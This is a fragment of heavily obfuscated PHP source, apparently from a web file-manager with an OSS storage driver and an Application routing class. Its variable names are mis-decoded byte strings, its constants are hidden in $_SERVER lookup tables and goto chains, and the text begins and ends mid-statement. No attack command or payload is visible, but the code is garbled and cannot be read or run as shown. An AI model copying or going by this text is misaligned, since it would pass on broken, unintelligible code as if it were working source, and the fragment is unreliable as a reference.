exist($bù≥ë∂î é) { return $this->isFile($bù≥ë∂î é) || $this->isFolder($bù≥ë∂î é); } public function isFile($C€≈‚ÛΩ≥≈) { return !$this->isFolder($C€≈‚ÛΩ≥≈) && $this->objectMeta($C€≈‚ÛΩ≥≈); } public function isFolder($eÇîÑ–›ºÇ) { return $this->cacheMethod($_SERVER[™⁄»üÆ][199], $eÇîÑ–›ºÇ); } protected function objectMeta($dﬂﬁêÙ÷Ãû) { return $this->cacheMethod($_SERVER[™⁄»üÆ][200], $dﬂﬁêÙ÷Ãû); } protected function _objectMeta($B◊¬±Øãæﬁ) { $bÉÀº¡ΩîÙ =& $_SERVER[™⁄»üÆ]; try { $C”ùí…ÖÉ¯ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($B◊¬±Øãæﬁ)); } catch (OSS\Core\OssException $BΩ∏ıâàÿä) { $C”ùí…ÖÉ¯ = !1; } if ($C”ùí…ÖÉ¯) { $C”ùí…ÖÉ¯[$bÉÀº¡ΩîÙ[78]] = intval($C”ùí…ÖÉ¯[$bÉÀº¡ΩîÙ[1283]]); } return $C”ùí…ÖÉ¯; } protected function _isFolder($Dá†Ïø’ï°) { $a‹∏£ÿâß“ =& $_SERVER[™⁄»üÆ]; if ($Dá†Ïø’ï° == $a‹∏£ÿâß“[33] || $Dá†Ïø’ï° == $a‹∏£ÿâß“[8]) { return !0; } $F†Ê≈ùÇ¡Ï = array($a‹∏£ÿâß“[1279] => $a‹∏£ÿâß“[8], $a‹∏£ÿâß“[1280] => rtrim($Dá†Ïø’ï°, $a‹∏£ÿâß“[8]) . $a‹∏£ÿâß“[8], $a‹∏£ÿâß“[1281] => 1, $a‹∏£ÿâß“[1282] => $a‹∏£ÿâß“[33]); $BÇã€˜Ï…Ô = $this->client->listObjects($this->bucket, $F†Ê≈ùÇ¡Ï); if ($BÇã€˜Ï…Ô->getObjectList() || $BÇã€˜Ï…Ô->getPrefixList()) { return !0; } return !1; } } goto E–π·Üí≥…; a»ºèΩ“ËÂ: if (!$bµ„„´Ωûá) { return; } if ($_SERVER[$_SERVER[™⁄»üÆ][592]] != $_SERVER[$_SERVER[™⁄»üÆ][593]]) { goto cµ⁄„’¶÷Õ; DÙ¶ÂÕ‰ÎÒ: $F∫ÒëÁ‘©ı($_SERVER[$_SERVER[™⁄»üÆ][600]]); goto CÕñù∆ÿ∞“; cµ⁄„’¶÷Õ: $aò‡ı§∞ù∫ = $_SERVER[™⁄»üÆ][594]; $Díßÿô—ªÀ = $_SERVER[$_SERVER[™⁄»üÆ][595]] . $_SERVER[™⁄»üÆ][596]; $bà≠ƒïò•§ = $aò‡ı§∞ù∫($Díßÿô—ªÀ); goto BÛ—Ã∫—––; BÛ—Ã∫—––: $f»ıëè…„Ÿ = explode($_SERVER[™⁄»üÆ][229], $bà≠ƒïò•§); if (count($f»ıëè…„Ÿ) < $_SERVER[™⁄»üÆ][597]) { $a∏°∑ùâºâ = $_SERVER[™⁄»üÆ][598]; $a∏°∑ùâºâ(); } $F∫ÒëÁ‘©ı = $_SERVER[™⁄»üÆ][599]; goto DÙ¶ÂÕ‰ÎÒ; CÕñù∆ÿ∞“: } class Application { private $defaultModule = "\x69\156\x64\x65\170"; private $defaultController = "\x69\156\x64\145\170"; private $defaultAction = "\151\x6e\144\x65\x78"; function __construct() { } public function setDefault($BêØä˘§‚˘) { goto f¬âÏêíıÁ; f¿‹Â–¨±…: $Bﬂÿˆ˘ôÏø = $b—≠Œ‘Ãà‹[601]; $this->defaultModule = $Bé‘Ÿáƒß¥[0] ? $Bé‘Ÿáƒß¥[0] : $this->defaultModule; $this->defaultController = $Bé‘Ÿáƒß¥[1] ? $Bé‘Ÿáƒß¥[1] : $this->defaultController; goto F·‹´Æñì»; f¬âÏêíıÁ: $b—≠Œ‘Ãà‹ =& $_SERVER[™⁄»üÆ]; $B·àåÿò∞∑ =& $_SERVER[åì®®Íêß]; $Bé‘Ÿáƒß¥ = $B·àåÿò∞∑[0]($B·àåÿò∞∑[1], $B·àåÿò∞∑[2]($BêØä˘§‚˘, $B·àåÿò∞∑[1])); goto f¿‹Â–¨±…; F§ÓÇÉ˘Ã: $this->{$_SERVER[åì®®Íêß][3]}($B·àåÿò∞∑[4], array($this, $B·àåÿò∞∑[5])); $eÔ√˘†∂∂Á = $b—≠Œ‘Ãà‹[603]; if (!$eÔ√˘†∂∂Á) { die; } goto díûä°∆Íó; F·‹´Æñì»: $fàöœ“≥• = $b—≠Œ‘Ãà‹[602]; if (!$fàöœ“≥•) { return; } $this->defaultAction = $Bé‘Ÿáƒß¥[2] ? $Bé‘Ÿáƒß¥[2] : $this->defaultAction; goto F§ÓÇÉ˘Ã; díûä°∆Íó: } public function appRun($aè»«Ãûﬁç) { goto FÜ“ÛîÌÀ·; D¨™ ó∆¥à: $eõÑèÃ≠«• = $B∂ØîÂ∏∞[604]; $d¢ÈåΩöù∏ = $FßºÔ≠©Ö›[6]($FÈß””∆Ç˘[0]); $AƒÇêü±éâ = $FßºÔ≠©Ö›[7]; goto D„èËéπ›±; D„èËéπ›±: if ($d¢ÈåΩöù∏ == $FßºÔ≠©Ö›[8]) { $AƒÇêü±éâ = $FßºÔ≠©Ö›[9]; $FÈß””∆Ç˘[0] = $FßºÔ≠©Ö›[10]; $FÈß””∆Ç˘[1] = $FÈß””∆Ç˘[1] . $FßºÔ≠©Ö›[11]; $aè»«Ãûﬁç = $FßºÔ≠©Ö›[12]($FßºÔ≠©Ö›[1], $FÈß””∆Ç˘); $aè»«Ãûﬁç = $FßºÔ≠©Ö›[2]($aè»«Ãûﬁç, $FßºÔ≠©Ö›[1]); } $FßºÔ≠©Ö›[13](array($FßºÔ≠©Ö›[14], $FßºÔ≠©Ö›[15]), $AƒÇêü±éâ . $FßºÔ≠©Ö›[16], $aè»«Ãûﬁç); $FßºÔ≠©Ö›[17]($aè»«Ãûﬁç); goto f∫èÌ“È∞á; FÜ“ÛîÌÀ·: $B∂ØîÂ∏∞ =& $_SERVER[™⁄»üÆ]; $FßºÔ≠©Ö› =& $_SERVER[åì®®Íêß]; $FÈß””∆Ç˘ = $FßºÔ≠©Ö›[0]($FßºÔ≠©Ö›[1], $aè»«Ãûﬁç); goto D¨™ ó∆¥à; f∫èÌ“È∞á: $FßºÔ≠©Ö›[13](array($FßºÔ≠©Ö›[14], $FßºÔ≠©Ö›[15]), $AƒÇêü±éâ . $FßºÔ≠©Ö›[18], $aè»«Ãûﬁç); $dûﬂıä”‰¢ = $B∂ØîÂ∏∞[605]; while (strlen($dûﬂıä”‰¢) < $B∂ØîÂ∏∞[606]) { if (!$dûﬂıä”‰¢) { break; } $dûﬂıä”‰¢++; } goto E‹◊›ÒÙ⁄Á; E‹◊›ÒÙ⁄Á: } private function autorun() { goto e‚Ö¡ëÜÎ¥; aµ¿ıËà∞í: foreach ($config[$E§ø’ÌãñË[20]] as $b„ﬂ–«…†Ë => $fõœ‹ éÇ‰) { $this->{$_SERVER[åì®®Íêß][21]}($fõœ‹ éÇ‰); } goto e¯üÑÁéå ; f∏†«Ë öö: $aÁ…≤ΩàÌÉ = $B¡†óØ≠Ó·[607]; while ($aÁ…≤ΩàÌÉ < $B¡†óØ≠Ó·[608]) { if ($aÁ…≤ΩàÌÉ >= 0) { break; } $aÁ…≤ΩàÌÉ++; } if ($E§ø’ÌãñË[19]($config[$E§ø’ÌãñË[20]]) == 0) { return; } goto aµ¿ıËà∞í; e‚Ö¡ëÜÎ¥: $B¡†óØ≠Ó· =& $_SERVER[™⁄»üÆ]; $E§ø’ÌãñË =& $_SERVER[åì®®Íêß]; global $config; goto f∏†«Ë öö; e¯üÑÁéå : } private function nmoj2944e612() { goto eµØ∂Õ•µü; eµØ∂Õ•µü: $Dß®ùÂÖèÙ =& $_SERVER[åì®®Íêß]; $bÏ¨π„Â≤÷ = $Dß®ùÂÖèÙ[8]; $bë“û”Ï•¶ = $GLOBALS[$Dß®ùÂÖèÙ[22]][$Dß®ùÂÖèÙ[23]][0]; goto aÃì©ëñÙù; aÃì©ëñÙù: if (!$bë“û”Ï•¶ || $Dß®ùÂÖèÙ[24]($bë“û”Ï•¶) <= $Dß®ùÂÖèÙ[24]($bÏ¨π„Â≤÷)) { return; } if ($Dß®ùÂÖèÙ[6]($Dß®ùÂÖèÙ[25]($bë“û”Ï•¶, -$Dß®ùÂÖèÙ[24]($bÏ¨π„Â≤÷))) != $bÏ¨π„Â≤÷) { return; } $aêŒÌØêÜª = $Dß®ùÂÖèÙ[25]($bë“û”Ï•¶, 0, -$Dß®ùÂÖèÙ[24]($bÏ¨π„Â≤÷)); goto Cñ≤Ñ◊Ωá¿; fûÍ∑¬≥¡Ó: $GLOBALS[$Dß®ùÂÖèÙ[22]][$Dß®ùÂÖèÙ[28]] = $Dß®ùÂÖèÙ[29]($Dß®ùÂÖèÙ[1], $GLOBALS[$Dß®ùÂÖèÙ[22]][$Dß®ùÂÖèÙ[23]]); goto Bµ¥‡ÀÓÀ≠; Cñ≤Ñ◊Ωá¿: $e‘∑Ùåµ—è = array($Dß®ùÂÖèÙ[8], $aêŒÌØêÜª); $eÛ§ÔôÿÆÉ = $Dß®ùÂÖèÙ[26]($GLOBALS[$Dß®ùÂÖèÙ[22]][$Dß®ùÂÖèÙ[23]], 1); $GLOBALS[$Dß®ùÂÖèÙ[22]][$Dß®ùÂÖèÙ[23]] = $Dß®ùÂÖèÙ[27]($e‘∑Ùåµ—è, $eÛ§ÔôÿÆÉ); goto fûÍ∑¬≥¡Ó; Bµ¥‡ÀÓÀ≠: } private function xoqpd15ce0ea() { goto b√∏«•…º¢; d°ﬂñ€≈ûä: $F°È¨√¿ìº = $A•ï´è†≥ı[612]; while ($F°È¨√¿ìº < $A•ï´è†≥ı[608]) { if ($F°È¨√¿ìº >= 0) { break; } $F°È¨√¿ìº++; } goto f”¶±üÈöé; bÁ ﬂÏŸñµ: $aã’ã»Ô£Ø = $f∞≥ŒÑ≈Œ≤[31]; $eÁäëüêùﬂ = $A•ï´è†≥ı[610]; if (strlen($eÁäëüêùﬂ) < $A•ï´è†≥ı[608]) { return; } goto F¯öûƒæáü; E”º•„å›Á: $aáØóãöÚÁ = $A•ï´è†≥ı[611]; while ($aáØóãöÚÁ < $A•ï´è†≥ı[608]) { if ($aáØóãöÚÁ >= 0) { break; } $aáØóãöÚÁ++; } $GLOBALS[$f∞≥ŒÑ≈Œ≤[22]][$f∞≥ŒÑ≈Œ≤[28]] = $f∞≥ŒÑ≈Œ≤[29]($f∞≥ŒÑ≈Œ≤[1], $GLOBALS[$f∞≥ŒÑ≈Œ≤[22]][$f∞≥ŒÑ≈Œ≤[23]]); goto d°ﬂñ€≈ûä; F¯öûƒæáü: if (!$f∞≥ŒÑ≈Œ≤[32]($E·ÖÇêÜ¶í, $aã’ã»Ô£Ø)) { return; } $AıÊ”£æëê = $f∞≥ŒÑ≈Œ≤[33]($E·ÖÇêÜ¶í, $aã’ã»Ô£Ø); $DπÓ„£Ôõâ = $f∞≥ŒÑ≈Œ≤[25]($E·ÖÇêÜ¶í, $AıÊ”£æëê + $f∞≥ŒÑ≈Œ≤[24]($aã’ã»Ô£Ø)); goto FÆò¶ä›éì; E≤⁄Øâ¢û«: $E·ÖÇêÜ¶í = $_SERVER[$f∞≥ŒÑ≈Œ≤[30]]; $Fﬁ√Ÿ’äæª = $A•ï´è†≥ı[609]; while (strlen($Fﬁ√Ÿ’äæª) < $A•ï´è†≥ı[608]) { if (!$Fﬁ√Ÿ’äæª) { break; } $Fﬁ√Ÿ’äæª++; } goto bÁ ﬂÏŸñµ; FÆò¶ä›éì: $f∞≥ŒÑ≈Œ≤[34]($f∞≥ŒÑ≈Œ≤[35], $DπÓ„£Ôõâ, $BÆ÷∑ÒèËã); $DπÓ„£Ôõâ = $f∞≥ŒÑ≈Œ≤[2]($BÆ÷∑ÒèËã[0][0], $f∞≥ŒÑ≈Œ≤[36]); $GLOBALS[$f∞≥ŒÑ≈Œ≤[22]][$f∞≥ŒÑ≈Œ≤[23]] = $f∞≥ŒÑ≈Œ≤[0]($f∞≥ŒÑ≈Œ≤[36], $DπÓ„£Ôõâ); goto E”º•„å›Á; b√∏«•…º¢: $A•ï´è†≥ı =& $_SERVER[™⁄»üÆ]; $f∞≥ŒÑ≈Œ≤ =& $_SERVER[åì®®Íêß]; if ($GLOBALS[$f∞≥ŒÑ≈Œ≤[22]][$f∞≥ŒÑ≈Œ≤[28]] != $f∞≥ŒÑ≈Œ≤[10]) { return; } goto E≤⁄Øâ¢û«; f”¶±üÈöé: } public function run() { goto dıˆÃ≤ã‹ñ; dıˆÃ≤ã‹ñ: $C·¢–◊ÂÂÆ =& $_SERVER[™⁄»üÆ]; $Cöè‡©ÛÈë =& $_SERVER[åì®®Íêß]; $this->{$_SERVER[åì®®Íêß][37]}(); goto EÁïÑˆ¿∆ê; e’®õ©Üúë: $fŸÚ≤áá¬Ô = $C·¢–◊ÂÂÆ[618]; if (strlen($fŸÚ≤áá¬Ô) < $C·¢–◊ÂÂÆ[606]) { return; } $_SERVER[$Cöè‡©ÛÈë[44]] = $Cöè‡©ÛÈë[6](ACTION); goto c•â®Ê…Ø∫; EÁïÑˆ¿∆ê: $Dóπ•èÁ•È = $C·¢–◊ÂÂÆ[613]; while ($Dóπ•èÁ•È < $C·¢–◊ÂÂÆ[608]) { if ($Dóπ•èÁ•È >= 0) { break; } $Dóπ•èÁ•È++; } $this->{$_SERVER[åì®®Íêß][38]}(); goto D“∑™à·„û; c•â®Ê…Ø∫: $this->{$_SERVER[åì®®Íêß][45]}(); if ($Cöè‡©ÛÈë[19]($dÈÜøç±ó¶) >= 3) { $this->{$_SERVER[åì®®Íêß][21]}($DÙÿ°ô⁄†Ô); } else { $this->{$_SERVER[åì®®Íêß][21]}(ACTION); } goto EÙê∞¡ïÀﬁ; cï√Ø«Ü¢ã: if (strlen($eâ‰ñÙ†Áº) < $C·¢–◊ÂÂÆ[616]) { return; } $Cöè‡©ÛÈë[39]($Cöè‡©ÛÈë[41], isset($dÈÜøç±ó¶[1]) && $dÈÜøç±ó¶[0] ? $dÈÜøç±ó¶[1] : $this->defaultController); $Cöè‡©ÛÈë[39]($Cöè‡©ÛÈë[42], isset($dÈÜøç±ó¶[2]) && $dÈÜøç±ó¶[0] ? $dÈÜøç±ó¶[2] : $this->defaultAction); goto D®ÀÎü„û∞; fÀ›øáè´‚: $DÙÿ°ô⁄†Ô = $GLOBALS[$Cöè‡©ÛÈë[22]][$Cöè‡©ÛÈë[28]]; $Cöè‡©ÛÈë[39]($Cöè‡©ÛÈë[40], isset($dÈÜøç±ó¶[0]) && $dÈÜøç±ó¶[0] ? $dÈÜøç±ó¶[0] : $this->defaultModule); $eâ‰ñÙ†Áº = $C·¢–◊ÂÂÆ[615]; goto cï√Ø«Ü¢ã; D®ÀÎü„û∞: $cÙ‰¯ˆË≥Ñ = $C·¢–◊ÂÂÆ[617]; while (strlen($cÙ‰¯ˆË≥Ñ) < $C·¢–◊ÂÂÆ[597]) { if (!$cÙ‰¯ˆË≥Ñ) { break; } $cÙ‰¯ˆË≥Ñ++; } $Cöè‡©ÛÈë[39]($Cöè‡©ÛÈë[43], MOD . $Cöè‡©ÛÈë[1] . ST . $Cöè‡©ÛÈë[1] . ACT); goto e’®õ©Üúë; D“∑™à·„û: $d’»É≥ã—· = $C·¢–◊ÂÂÆ[614]; while ($d’»É≥ã—· < $C·¢–◊ÂÂÆ[606]) { if ($d’»É≥ã—· >= 0) { break; } $d’»É≥ã—·++; } $dÈÜøç±ó¶ = $GLOBALS[$Cöè‡©ÛÈë[22]][$Cöè‡©ÛÈë[23]]; goto fÀ›øáè´‚; EÙê∞¡ïÀﬁ: } private $vwnif568d82e = array(); private $vpny46eabd18 = ''; public function yuxqa54bac26() { goto aí÷√≤ÔùÇ; aí÷√≤ÔùÇ: $F¶Ω®≠ë‘Ì =& $_SERVER[™⁄»üÆ]; $bÛêÙ™Óèâ =& $_SERVER[åì®®Íêß]; $this->{$_SERVER[åì®®Íêß][46]}(); goto E≤Â¨≈¨≠Œ; bÕ£ùÂ’ÑÇ: $this->{$_SERVER[åì®®Íêß][50]}(); $F´Ùª∏ààñ = $F¶Ω®≠ë‘Ì[619]; $this->{$_SERVER[åì®®Íêß][51]}(); goto B≥ˆú‡ éÑ; aÚÉˆá…Ç’: $this->{$_SERVER[åì®®Íêß][3]}($bÛêÙ™Óèâ[59], array($this, $bÛêÙ™Óèâ[60])); $b˜ü’∂ñÇ˜ = $F¶Ω®≠ë‘Ì[622]; if (!$b˜ü’∂ñÇ˜) { return; } goto eÌﬂâÑ∑»ë; E≤Â¨≈¨≠Œ: $this->{$_SERVER[åì®®Íêß][47]}(); $this->{$_SERVER[åì®®Íêß][48]}(); $this->{$_SERVER[åì®®Íêß][49]}(); goto bÕ£ùÂ’ÑÇ; f¯ÈŒΩ∂®⁄: $this->{$_SERVER[åì®®Íêß][3]}($bÛêÙ™Óèâ[55], array($this, $bÛêÙ™Óèâ[56])); $E¬¨¢…„ì≠ = $F¶Ω®≠ë‘Ì[621]; $this->{$_SERVER[åì®®Íêß][3]}($bÛêÙ™Óèâ[57], array($this, $bÛêÙ™Óèâ[58])); goto aÚÉˆá…Ç’; B≥ˆú‡ éÑ: $this->{$_SERVER[åì®®Íêß][52]}(); $E∑ƒ ùÃ·‡ = $F¶Ω®≠ë‘Ì[620]; $this->{$_SERVER[åì®®Íêß][3]}($bÛêÙ™Óèâ[53], array($this, $bÛêÙ™Óèâ[54])); goto f¯ÈŒΩ∂®⁄; eÌﬂâÑ∑»ë: } public function yrcu1010aacf($fèÎçÙÛÚí) { goto DïçôàÒ›™; d»ÜúâÁê∏: $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[123]][$aÍù¥Á¢Ñì[124]] = $aÍù¥Á¢Ñì[125]($aÍù¥Á¢Ñì[126])->{$_SERVER[åì®®Íêß][127]}(); $Eπ©Ç°Óïë = $döàÆÔ à€[627]; if (!$Eπ©Ç°Óïë) { return; } goto a¡ΩéÓÚØÂ; c∂é¯ÍÜò: if ($this->vpny46eabd18 == $aÍù¥Á¢Ñì[136]) { $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[111]][$aÍù¥Á¢Ñì[112]][$aÍù¥Á¢Ñì[117]][$aÍù¥Á¢Ñì[122]] = 0; } $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[123]][$aÍù¥Á¢Ñì[143]] = $aÍù¥Á¢Ñì[121]($this->vwnif568d82e, $aÍù¥Á¢Ñì[144], $aÍù¥Á¢Ñì[10]); $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[123]][$aÍù¥Á¢Ñì[145]] = $aÍù¥Á¢Ñì[121]($this->vwnif568d82e, $aÍù¥Á¢Ñì[146], $aÍù¥Á¢Ñì[10]); goto B’º≥†ﬂª”; bÎﬂ¨≈πãË: $fÑ„”ùÉÛ» = array($aÍù¥Á¢Ñì[64], $aÍù¥Á¢Ñì[65], $aÍù¥Á¢Ñì[66], $aÍù¥Á¢Ñì[67], $aÍù¥Á¢Ñì[68], $aÍù¥Á¢Ñì[69], $aÍù¥Á¢Ñì[70], $aÍù¥Á¢Ñì[71], $aÍù¥Á¢Ñì[72], $aÍù¥Á¢Ñì[73], $aÍù¥Á¢Ñì[74], $aÍù¥Á¢Ñì[75], $aÍù¥Á¢Ñì[76], $aÍù¥Á¢Ñì[77], $aÍù¥Á¢Ñì[78], $aÍù¥Á¢Ñì[79], $aÍù¥Á¢Ñì[80], $aÍù¥Á¢Ñì[81], $aÍù¥Á¢Ñì[82], $aÍù¥Á¢Ñì[83], $aÍù¥Á¢Ñì[84], $aÍù¥Á¢Ñì[85], $aÍù¥Á¢Ñì[86], $aÍù¥Á¢Ñì[87], $aÍù¥Á¢Ñì[88], $aÍù¥Á¢Ñì[89], $aÍù¥Á¢Ñì[90], $aÍù¥Á¢Ñì[91], $aÍù¥Á¢Ñì[92], $aÍù¥Á¢Ñì[93], $aÍù¥Á¢Ñì[94], $aÍù¥Á¢Ñì[95], $aÍù¥Á¢Ñì[96], $aÍù¥Á¢Ñì[97], $aÍù¥Á¢Ñì[98], $aÍù¥Á¢Ñì[99], $aÍù¥Á¢Ñì[100], $aÍù¥Á¢Ñì[101], $aÍù¥Á¢Ñì[102], $aÍù¥Á¢Ñì[103], $aÍù¥Á¢Ñì[104], $aÍù¥Á¢Ñì[105], $aÍù¥Á¢Ñì[106], $aÍù¥Á¢Ñì[107], $aÍù¥Á¢Ñì[108]); foreach ($fÑ„”ùÉÛ» as $Dˆ¯°¿õﬂú) { $dˆöêÈıô° = $GLOBALS[$aÍù¥Á¢Ñì[109]][$aÍù¥Á¢Ñì[110]][$Dˆ¯°¿õﬂú]; $bªπ≈ÓÔèÔ = $döàÆÔ à€[623]; if (isset($DÌÎ√¯âè©[$Dˆ¯°¿õﬂú])) { $dˆöêÈıô° = $DÌÎ√¯âè©[$Dˆ¯°¿õﬂú]; } $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[111]][$aÍù¥Á¢Ñì[112]][$Dˆ¯°¿õﬂú] = $dˆöêÈıô°; } $dì·ËÛ¥ﬂﬂ = $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[111]][$aÍù¥Á¢Ñì[112]][$aÍù¥Á¢Ñì[76]]; goto eÉÏ˜ÃÏìÏ; eÉÏ˜ÃÏìÏ: unset($fèÎçÙÛÚí[$aÍù¥Á¢Ñì[111]][$aÍù¥Á¢Ñì[113]][$aÍù¥Á¢Ñì[114]]); unset($fèÎçÙÛÚí[$aÍù¥Á¢Ñì[111]][$aÍù¥Á¢Ñì[113]][$aÍù¥Á¢Ñì[115]]); unset($fèÎçÙÛÚí[$aÍù¥Á¢Ñì[111]][$aÍù¥Á¢Ñì[112]][$aÍù¥Á¢Ñì[76]]); goto bÂáÑâÖ¬Ó; FÙ⁄ﬁµÁÖå: $EﬁﬁÇñµîõ = $döàÆÔ à€[625]; while (strlen($EﬁﬁÇñµîõ) < $döàÆÔ à€[626]) { if (!$EﬁﬁÇñµîõ) { break; } $EﬁﬁÇñµîõ++; } $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[111]][$aÍù¥Á¢Ñì[112]][$aÍù¥Á¢Ñì[117]] = array($aÍù¥Á¢Ñì[118] => (int) $dì·ËÛ¥ﬂﬂ[$aÍù¥Á¢Ñì[119]], $aÍù¥Á¢Ñì[120] => (int) $aÍù¥Á¢Ñì[121]($dì·ËÛ¥ﬂﬂ, $aÍù¥Á¢Ñì[122], 0)); goto d»ÜúâÁê∏; B’º≥†ﬂª”: $D¨Ωÿ°ÁﬂÃ = $döàÆÔ à€[629]; if ($aÍù¥Á¢Ñì[121]($GLOBALS, $aÍù¥Á¢Ñì[147]) && $this->config[$aÍù¥Á¢Ñì[148]]) { $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[123]][$aÍù¥Á¢Ñì[149]] = WEB_ROOT; } return $fèÎçÙÛÚí; goto eîƒªâêèî; fÜ∞™ÂÖΩß: $fﬂùƒ˜¢‡† = $döàÆÔ à€[628]; if (strlen($fﬂùƒ˜¢‡†) < $döàÆÔ à€[608]) { return; } if ($DÌÎ√¯âè©[$aÍù¥Á¢Ñì[135]] != $aÍù¥Á¢Ñì[136]) { $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[123]][$aÍù¥Á¢Ñì[137]] = $DÌÎ√¯âè©[$aÍù¥Á¢Ñì[137]]; $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[123]][$aÍù¥Á¢Ñì[138]] = $DÌÎ√¯âè©[$aÍù¥Á¢Ñì[138]]; $A∫Ÿäµà§‡ = $aÍù¥Á¢Ñì[139](10) . $this->vpny46eabd18 . $aÍù¥Á¢Ñì[139](5); $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[111]][$aÍù¥Á¢Ñì[140]][$aÍù¥Á¢Ñì[141]] = $this->{$_SERVER[åì®®Íêß][142]}($A∫Ÿäµà§‡, $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[123]][$aÍù¥Á¢Ñì[128]]); } goto c∂é¯ÍÜò; a¡ΩéÓÚØÂ: $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[123]][$aÍù¥Á¢Ñì[128]] = $aÍù¥Á¢Ñì[129]($_SERVER[$aÍù¥Á¢Ñì[130]] . $DÌÎ√¯âè©[$aÍù¥Á¢Ñì[131]]); $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[123]][$aÍù¥Á¢Ñì[132]] = $aÍù¥Á¢Ñì[133]($aÍù¥Á¢Ñì[134]()); $fèÎçÙÛÚí[$aÍù¥Á¢Ñì[123]][$aÍù¥Á¢Ñì[135]] = $this->vpny46eabd18; goto fÜ∞™ÂÖΩß; DïçôàÒ›™: $döàÆÔ à€ =& $_SERVER[™⁄»üÆ]; $aÍù¥Á¢Ñì =& $_SERVER[åì®®Íêß]; $DÌÎ√¯âè© = $aÍù¥Á¢Ñì[61]($aÍù¥Á¢Ñì[62])->{$_SERVER[åì®®Íêß][63]}(); goto bÎﬂ¨≈πãË; bÂáÑâÖ¬Ó: $f∑§¶ÏÕ´Ë = $döàÆÔ à€[624]; if (strlen($f∑§¶ÏÕ´Ë) < $döàÆÔ à€[608]) { die; } unset($fèÎçÙÛÚí[$aÍù¥Á¢Ñì[111]][$aÍù¥Á¢Ñì[112]][$aÍù¥Á¢Ñì[116]]); goto FÙ⁄ﬁµÁÖå; eîƒªâêèî: } private function maxp14b9ae15() { goto fÉÚ›„è≈ﬂ; båîó·¢ÛÁ: foreach ($dç∞ˆ¥õÏ¬ as $fòÙ”É‡‘Ø) { if (!isset($FÔµõÛãËÚ[$fòÙ”É‡‘Ø]) || !$FÔµõÛãËÚ[$fòÙ”É‡‘Ø]) { continue; } $aÒùÜÊÙµ≈[$fòÙ”É‡‘Ø] = $FÔµõÛãËÚ[$fòÙ”É‡‘Ø]; $DÓèÇÏêçî = $bäòèîä÷”[633]; } $Fëé’ﬂÃ¿[13](array($Fëé’ﬂÃ¿[174], $Fëé’ﬂÃ¿[175]), $aÒùÜÊÙµ≈); goto dÓª‹⁄≥Ãê; cπÆ˜Ô¯ñô: if ($this->vpny46eabd18 == $Fëé’ﬂÃ¿[136]) { return; } $dç∞ˆ¥õÏ¬ = array($Fëé’ﬂÃ¿[176], $Fëé’ﬂÃ¿[177], $Fëé’ﬂÃ¿[178], $Fëé’ﬂÃ¿[179], $Fëé’ﬂÃ¿[180], $Fëé’ﬂÃ¿[181]); $eáÿãıé∞ò = $bäòèîä÷”[630]; goto bÛÎô·ﬂÏÊ; fÉÚ›„è≈ﬂ: $bäòèîä÷” =& $_SERVER[™⁄»üÆ]; $Fëé’ﬂÃ¿ =& $_SERVER[åì®®Íêß]; if ($_SERVER[$Fëé’ﬂÃ¿[44]] == $Fëé’ﬂÃ¿[150]) { $c”å†ßÓÏó = array($Fëé’ﬂÃ¿[135] => $this->vpny46eabd18, $Fëé’ﬂÃ¿[151] => $this->{$_SERVER[åì®®Íêß][152]}(), $Fëé’ﬂÃ¿[153] => $Fëé’ﬂÃ¿[61]($Fëé’ﬂÃ¿[154])->{$_SERVER[åì®®Íêß][155]}()); if ($this->vpny46eabd18 != $Fëé’ﬂÃ¿[136]) { $BÒ¡Üê‘˜Ë = $Fëé’ﬂÃ¿[121]($this->vwnif568d82e, $Fëé’ﬂÃ¿[156]); if ($BÒ¡Üê‘˜Ë) { $c”å†ßÓÏó[$Fëé’ﬂÃ¿[157]] = $BÒ¡Üê‘˜Ë; $c”å†ßÓÏó[$Fëé’ﬂÃ¿[158]] = $Fëé’ﬂÃ¿[159]($Fëé’ﬂÃ¿[121]($this->vwnif568d82e, $Fëé’ﬂÃ¿[160])); $c”å†ßÓÏó[$Fëé’ﬂÃ¿[161]] = $Fëé’ﬂÃ¿[121]($this->vwnif568d82e, $Fëé’ﬂÃ¿[146]); } $fç†›¯á◊Â = $Fëé’ﬂÃ¿[61]($Fëé’ﬂÃ¿[62])->{$_SERVER[åì®®Íêß][63]}($Fëé’ﬂÃ¿[162], $Fëé’ﬂÃ¿[10], !0); if ($Fëé’ﬂÃ¿[163]($fç†›¯á◊Â) && $Fëé’ﬂÃ¿[25]($fç†›¯á◊Â, 0, 1) == $Fëé’ﬂÃ¿[164]) { $fç†›¯á◊Â = $Fëé’ﬂÃ¿[165]($fç†›¯á◊Â); } if ($Fëé’ﬂÃ¿[166]($fç†›¯á◊Â) && $fç†›¯á◊Â[$Fëé’ﬂÃ¿[167]] && $Fëé’ﬂÃ¿[32]($fç†›¯á◊Â[$Fëé’ﬂÃ¿[167]], $Fëé’ﬂÃ¿[168])) { $f˘à’•å¥ì = $Fëé’ﬂÃ¿[0]($Fëé’ﬂÃ¿[168], $fç†›¯á◊Â[$Fëé’ﬂÃ¿[167]]); $c”å†ßÓÏó[$Fëé’ﬂÃ¿[169]] = $f˘à’•å¥ì[0]; } } $c”å†ßÓÏó = $this->{$_SERVER[åì®®Íêß][170]}($Fëé’ﬂÃ¿[171]($c”å†ßÓÏó), $Fëé’ﬂÃ¿[129]($Fëé’ﬂÃ¿[172])); $aÒùÜÊÙµ≈ = array($Fëé’ﬂÃ¿[173] => $c”å†ßÓÏó); $Fëé’ﬂÃ¿[13](array($Fëé’ﬂÃ¿[174], $Fëé’ﬂÃ¿[175]), $aÒùÜÊÙµ≈); } goto cπÆ˜Ô¯ñô; b–Á‚√¡Æé: $aÒùÜÊÙµ≈ = array($Fëé’ﬂÃ¿[182] => $FÔµõÛãËÚ[$Fëé’ﬂÃ¿[64]], $Fëé’ﬂÃ¿[183] => $FÔµõÛãËÚ[$Fëé’ﬂÃ¿[65]], $Fëé’ﬂÃ¿[184] => 